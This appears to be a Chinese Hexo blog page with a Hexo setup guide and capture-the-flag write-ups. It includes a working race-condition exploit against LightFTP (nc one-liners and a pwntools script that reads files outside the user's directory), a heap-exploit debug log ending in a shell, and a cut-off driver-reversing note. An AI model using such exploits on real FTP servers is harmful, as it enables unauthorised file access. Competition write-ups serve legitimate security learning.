        <h2 id="安装git和nodejs"><a href="#安装git和nodejs" class="headerlink" title="安装git和nodejs"></a>安装git和nodejs</h2><p>官方下载地址: <a href="https://link.zhihu.com/?target=https://git-scm.com/download/win">Git - Downloading Package (git-scm.com)</a></p>
<p>官方下载地址: <a href="https://link.zhihu.com/?target=https://nodejs.org/en/">Node.js (nodejs.org)</a></p>
<p>在 cmd 中输入命令 <code>git --version</code>, 查看 Git 版本</p>
<p>在 cmd 中输入命令 <code>node -v</code>, 查看 Node 版本</p>
<h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><p>使用 cnpm 安装 Hexo，先通过 npm install 安装 cnpm。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g cnpm --registry==https://registry.npm.taobao.org</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 cmd 中输入命令 cnpm -v, 可查看 cnpm 版本</span></span><br><span class="line">cnpm install -g hexo-cli</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在 cmd 中输入命令 hexo -v, 可查看 hexo 版本</span></span><br></pre></td></tr></table></figure>





<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>hjkkgktest</p>
<p><img src="/2023/11/17/hello/wallhaven-rq75r7.jpg" alt="wallhaven-rq75r7"></p>
<p>et2<img src="/2023/11/17/hello/wallhaven-2yg1lg.png" alt="wallhaven-2yg1lg"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/11/17/hello/" data-id="cuidP-WXZQZxDwbRQArr7w28Y" data-title="hello" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-realworldctf2023" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/26/realworldctf2023/" class="article-date">
  <time class="dt-published" datetime="2023-07-26T02:15:47.000Z" itemprop="datePublished">2023-07-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/07/26/realworldctf2023/">2023 realworld ctf</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="NonHeavyFTP-pwn"><a href="#NonHeavyFTP-pwn" class="headerlink" title="NonHeavyFTP-pwn"></a>NonHeavyFTP-pwn</h2><p>感觉是一个路径穿越，但是不知道怎么弄</p>
<p>好吧，最终并不是一个我认为的路径穿越问题，怪不得我一直再试路径穿越，然并卵，gg</p>
<p>因为Theori 半个小时就把这个题目给秒了，所以我觉得肯定不是内存破坏的漏洞，不然应该不可能这么快，Pls.题目是Ubuntu22.04下面的并且保护全开</p>
<p>这是别人的exp，我直接懵了，好吧 也应该是race condition</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ (<span class="built_in">echo</span> -ne <span class="string">&#x27;USER anonymous\r\n&#x27;</span>; <span class="built_in">sleep</span> 0.5; <span class="built_in">echo</span> -ne <span class="string">&#x27;PASS a\r\n&#x27;</span>; <span class="built_in">sleep</span> 0.5; <span class="built_in">echo</span> -ne <span class="string">&#x27;PASV\r\n&#x27;</span>; <span class="built_in">sleep</span> 0.5; <span class="built_in">echo</span> -ne <span class="string">&#x27;MLSD .\r\n&#x27;</span>; <span class="built_in">sleep</span> 0.5; <span class="built_in">echo</span> -ne <span class="string">&#x27;USER /\r\n&#x27;</span>; <span class="built_in">cat</span>) | nc 47.</span><br><span class="line">89.253.219 2121</span><br><span class="line">220 LightFTP server ready</span><br><span class="line">331 User anonymous OK. Password required</span><br><span class="line">230 User logged <span class="keyword">in</span>, proceed.</span><br><span class="line">227 Entering Passive Mode (0,0,0,0,195,7).</span><br><span class="line">150 File status okay; about to open data connection.</span><br><span class="line">331 User / OK. Password required</span><br><span class="line">226 Transfer complete. Closing data connection.</span><br><span class="line"></span><br><span class="line">$ (<span class="built_in">echo</span> -ne <span class="string">&#x27;USER anonymous\r\n&#x27;</span>; <span class="built_in">sleep</span> 0.5; <span class="built_in">echo</span> -ne <span class="string">&#x27;PASS a\r\n&#x27;</span>; <span class="built_in">sleep</span> 0.5; <span class="built_in">echo</span> -ne <span class="string">&#x27;PASV\r\n&#x27;</span>; <span class="built_in">sleep</span> 0.5; <span class="built_in">echo</span> -ne <span class="string">&#x27;RETR hello.txt\r\n&#x27;</span>; <span class="built_in">sleep</span> 0.5; <span class="built_in">echo</span> -ne <span class="string">&#x27;USER /flag.deb10154-8cb2-11ed-be49-0242ac110002\r\n&#x27;</span>; <span class="built_in">cat</span>) | nc 47.89.253.219 2121</span><br><span class="line">220 LightFTP server ready</span><br><span class="line">331 User anonymous OK. Password required</span><br><span class="line">230 User logged <span class="keyword">in</span>, proceed.</span><br><span class="line">227 Entering Passive Mode (0,0,0,0,204,175).</span><br><span class="line">150 File status okay; about to open data connection.</span><br><span class="line">331 User /flag.deb10154-8cb2-11ed-be49-0242ac110002 OK. Password required</span><br><span class="line">226 Transfer complete. Closing data connection.1</span><br></pre></td></tr></table></figure>

<p>这个应该算是个逻辑漏洞吧，逻辑十分的诡异</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef&gt; info threads</span><br><span class="line">  Id   Target Id                                Frame</span><br><span class="line">* 1    Thread 0x7ffff774f940 (LWP 37747) <span class="string">&quot;fftp&quot;</span> __GI___libc_read (nbytes=0x400, buf=0x555555596770, fd=0x0) at ../sysdeps/unix/sysv/linux/read.c:26</span><br><span class="line">  2    Thread 0x7ffff774e640 (LWP 37760) <span class="string">&quot;fftp&quot;</span> 0x00007ffff7cb860f <span class="keyword">in</span> __libc_accept (fd=0x3, addr=&lt;optimized out&gt;, len=0x7ffff774dbf4) at ../sysdeps/unix/sysv/linux/accept.c:26</span><br><span class="line">  3    Thread 0x7ffff4927640 (LWP 37764) <span class="string">&quot;fftp&quot;</span> __libc_recv (flags=&lt;optimized out&gt;, len=0xfff, buf=0x7ffff4925c10, fd=0x4) at ../sysdeps/unix/sysv/linux/recv.c:28</span><br><span class="line">  4    Thread 0x7fffeffff640 (LWP 37768) <span class="string">&quot;fftp&quot;</span> 0x000055555555eac1 <span class="keyword">in</span> mlsd_thread ()</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP</span><br><span class="line"><span class="keyword">from</span> IPython <span class="keyword">import</span> embed</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;,&#x27;sp&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line">HOST,PORT = <span class="string">&quot;47.89.253.219&quot;</span>,<span class="number">2121</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">begin_dataport</span>():</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;PASV\r\n&#x27;</span>)</span><br><span class="line">  r(<span class="string">&#x27; Entering Passive Mode (&#x27;</span>)</span><br><span class="line">  _ = r(<span class="string">&#x27;)&#x27;</span>).split(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line">  <span class="keyword">return</span> (<span class="built_in">int</span>(_[-<span class="number">2</span>],<span class="number">10</span>)&lt;&lt;<span class="number">8</span>)+<span class="built_in">int</span>(_[-<span class="number">1</span>],<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase1</span>():</span><br><span class="line">  <span class="keyword">global</span> p</span><br><span class="line">  p = remote(HOST, PORT)</span><br><span class="line">  <span class="comment"># p = remote(&quot;127.0.0.1&quot;, 2121)</span></span><br><span class="line"></span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;USER anonymous\r\n&#x27;</span>)</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;PASS *********************\r\n&#x27;</span>)</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;OPTS UTF8 ON\r\n&#x27;</span>)</span><br><span class="line">  dataport = begin_dataport()</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;MLSD\r\n&#x27;</span>)</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;USER /\r\n&#x27;</span>)</span><br><span class="line">  <span class="built_in">print</span>(remote(HOST,dataport).recv())</span><br><span class="line">  p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase2</span>():</span><br><span class="line">  <span class="keyword">global</span> p</span><br><span class="line">  p = remote(HOST, PORT)</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;USER anonymous\r\n&#x27;</span>)</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;PASS *********************\r\n&#x27;</span>)</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;OPTS UTF8 ON\r\n&#x27;</span>)</span><br><span class="line">  dataport = begin_dataport()</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;RETR hello.txt\r\n&#x27;</span>)</span><br><span class="line">  s(<span class="string">&#x27;\r\n&#x27;</span>,<span class="string">&#x27;USER /flag.deb10154-8cb2-11ed-be49-0242ac110002\r\n&#x27;</span>)</span><br><span class="line">  <span class="built_in">print</span>(remote(HOST,dataport).recv())</span><br><span class="line"></span><br><span class="line">  p.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  <span class="comment"># phase1()</span></span><br><span class="line">  phase2()</span><br><span class="line"></span><br><span class="line"><span class="comment"># rwctf&#123;race-c0nd1tion-1s-real1y_ha4d_pr0blem!!!&#125;</span></span><br></pre></td></tr></table></figure>



<h2 id="tinyvm"><a href="#tinyvm" class="headerlink" title="tinyvm"></a>tinyvm</h2><p>这个我竟然也没有做出来，唉…，我找洞的水平是真的不行</p>
<h2 id="Hardened-Redis-pwn"><a href="#Hardened-Redis-pwn" class="headerlink" title="Hardened Redis-pwn"></a>Hardened Redis-pwn</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">❯ redis-server --version</span><br><span class="line">Redis server v=6.0.16 sha=00000000:0 malloc=jemalloc-5.2.1 bits=64 build=a3fdef44459b3ad6</span><br></pre></td></tr></table></figure>

<p>按照Dockerfile的说明安装redis-server之后，查看版本可以看到2021 October 4之后还有好几个security</p>
<p>首先要了解一些redis</p>
<p>redis是一个关系型数据库，主要使用C语言写的</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/26/realworldctf2023/" data-id="cuidYMVmQOrbQ9-RhbLR9iLBz" data-title="2023 realworld ctf" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-xctffinal2023" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/05/01/xctffinal2023/" class="article-date">
  <time class="dt-published" datetime="2023-05-01T03:07:10.000Z" itemprop="datePublished">2023-05-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/05/01/xctffinal2023/">2023 XCTF-final</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>.rodata:00000000004EBFD4 aEditchunk db ‘editChunk’,0 .rodata:00000000004EBFDE aShowchunk db ‘showChunk’,0 .rodata:00000000004EBFE8 aFree_0 db ‘free’,0 .rodata:00000000004EBFED aAlloc db ‘alloc’,0</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">.rodata:<span class="number">00000000004</span>EBFA0 _rodata         segment align_32 <span class="keyword">public</span> <span class="string">&#x27;CONST&#x27;</span> use64</span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFA0                 assume cs:_rodata</span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFA0                 ;org <span class="number">4</span>EBFA0h</span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFA0                 db <span class="string">&#x27;&gt;&gt;&gt; &#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFA5 aQuit           db <span class="string">&#x27;quit&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFAA aArgs           db <span class="string">&#x27;args&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFAF aLoad           db <span class="string">&#x27;load&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFB4 aMain           db <span class="string">&#x27;Main&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFB9 aMain_0         db <span class="string">&#x27;main&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFBE aUnpacker       db <span class="string">&#x27;Unpacker&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFC7 aAnyunpacker    db <span class="number">27</span>h,<span class="string">&#x27;AnyUnpacker&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFD4 aEditchunk      db <span class="string">&#x27;editChunk&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFDE aShowchunk      db <span class="string">&#x27;showChunk&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFE8 aFree_0         db <span class="string">&#x27;free&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFED aAlloc          db <span class="string">&#x27;alloc&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFF3 aApply          db <span class="string">&#x27;apply&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EBFF9 aUnreachable    db <span class="string">&#x27;Unreachable&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC005 aMyProject0100D db <span class="string">&#x27;my-project-0.1.0.0-DwBwI0ttuEjBxu8NjgEOfI&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC02F aInterpreter    db <span class="string">&#x27;Interpreter&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC03B aSrcInterpreter_2 db <span class="string">&#x27;src/Interpreter.hs&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC04E aError          db <span class="string">&#x27;error&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC054 aEqual          db <span class="string">&#x27;equal?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC05B aEqv            db <span class="string">&#x27;eqv?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC060 aEq             db <span class="string">&#x27;eq?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC064 aCons           db <span class="string">&#x27;cons&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC069 aCdr            db <span class="string">&#x27;cdr&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC06D aCar            db <span class="string">&#x27;car&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC071 aString         db <span class="string">&#x27;string&gt;=?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC07B aString_0       db <span class="string">&#x27;string&lt;=?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC085 aString_1       db <span class="string">&#x27;string&gt;?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC08E aString_2       db <span class="string">&#x27;string&lt;?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC097 aString_3       db <span class="string">&#x27;string=?&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0A0                 db <span class="string">&#x27;||&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0A3                 db <span class="string">&#x27;&amp;&amp;&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0A6                 db <span class="string">&#x27;&lt;=&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0A9                 db <span class="string">&#x27;&gt;=&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0AC                 db <span class="string">&#x27;/=&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0AF                 db <span class="string">&#x27;&gt;&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0B1                 db <span class="string">&#x27;&lt;&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0B3                 db <span class="string">&#x27;=&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0B5 aRemainder      db <span class="string">&#x27;remainder&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0BF aQuotient       db <span class="string">&#x27;quotient&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0C8 aMod            db <span class="string">&#x27;mod&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0CC                 text <span class="string">&quot;UTF-16LE&quot;</span>, <span class="string">&#x27;/*-+&#x27;</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0D4 aPair           db <span class="string">&#x27;pair&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC0D9 aBoolean        db <span class="string">&#x27;boolean&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC<span class="number">0E1</span> aString_4       db <span class="string">&#x27;string&#x27;</span>,<span class="number">0</span></span><br><span class="line">.rodata:<span class="number">00000000004</span>EC<span class="number">0E8</span> aNumber         db <span class="string">&#x27;number&#x27;</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>获取flag</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">  &#x27;15\n&#x27;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">  &#x27;size&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x4 bytes:</span><br><span class="line">  &#x27;256\n&#x27;</span><br><span class="line">[DEBUG] Received 0x8 bytes:</span><br><span class="line">  &#x27;Choice&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">  &#x27;0\n&#x27;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">  &#x27;index&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">  &#x27;12\n&#x27;</span><br><span class="line">[DEBUG] Received 0x6 bytes:</span><br><span class="line">  &#x27;size&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x4 bytes:</span><br><span class="line">  &#x27;256\n&#x27;</span><br><span class="line">[DEBUG] Received 0x8 bytes:</span><br><span class="line">  &#x27;Choice&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">  &#x27;1\n&#x27;</span><br><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">  &#x27;index&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">  &#x27;12\n&#x27;</span><br><span class="line">[DEBUG] Received 0x9 bytes:</span><br><span class="line">  &#x27;content&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x48 bytes:</span><br><span class="line">  00000000  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │····│····│····│····│</span><br><span class="line">  00000010  00 00 00 00  00 00 00 00  e6 13 35 b2  bf 7f 00 00  │····│····│··5·│····│</span><br><span class="line">  00000020  e5 13 35 b2  bf 7f 00 00  98 f6 4f b2  bf 7f 00 00  │··5·│····│··O·│····│</span><br><span class="line">  00000030  51 2e 35 b2  bf 7f 00 00  00 00 00 00  00 00 00 00  │Q.5·│····│····│····│</span><br><span class="line">  00000040  60 7d 37 b2  bf 7f 00 00                            │`&#125;7·│····│</span><br><span class="line">  00000048</span><br><span class="line">[DEBUG] Received 0x8 bytes:</span><br><span class="line">  &#x27;Choice&gt; &#x27;</span><br><span class="line">[DEBUG] Sent 0x2 bytes:</span><br><span class="line">  &#x27;4\n&#x27;</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> flag</span></span><br><span class="line">[DEBUG] Sent 0x9 bytes:</span><br><span class="line">  &#x27;cat flag\n&#x27;</span><br><span class="line">[DEBUG] Received 0x27 bytes:</span><br><span class="line">  &#x27;flag&#123;0j8aSdlayutn8HwCNbwLdk1ZYCxgcLsk&#125;\n&#x27;</span><br><span class="line">flag&#123;0j8aSdlayutn8HwCNbwLdk1ZYCxgcLsk&#125;</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">[*] Interrupted</span></span><br><span class="line">[*] Closed connection to 172.35.4.111 port 8888</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/05/01/xctffinal2023/" data-id="cuid45LoVHir3MT93eXMPoaQF" data-title="2023 XCTF-final" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-wmctf2022" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/08/26/wmctf2022/" class="article-date">
  <time class="dt-published" datetime="2022-08-26T03:07:10.000Z" itemprop="datePublished">2022-08-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/08/26/wmctf2022/">2022 WMCTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="babaydriver-rev"><a href="#babaydriver-rev" class="headerlink" title="babaydriver-rev"></a>babaydriver-rev</h2><p>64bit的一个Windows Driver逆向</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span> __fastcall <span class="title">sub_1400062A0</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+38h] [rbp-110h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">28</span>]; <span class="comment">// [rsp+50h] [rbp-F8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="built_in">sizeof</span>(v5));</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">0x123456111</span>i64;</span><br><span class="line">  v5[<span class="number">1</span>] = a1;</span><br><span class="line">  v5[<span class="number">2</span>] = a2;</span><br><span class="line">  v5[<span class="number">3</span>] = a3;</span><br><span class="line">  <span class="built_in">memset</span>(v4, <span class="number">0</span>, <span class="built_in">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">NtQueryInformationFile</span>(qword_140090048, v4, v5, <span class="number">0xE0</span>i64, <span class="number">0x34</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最终</p>
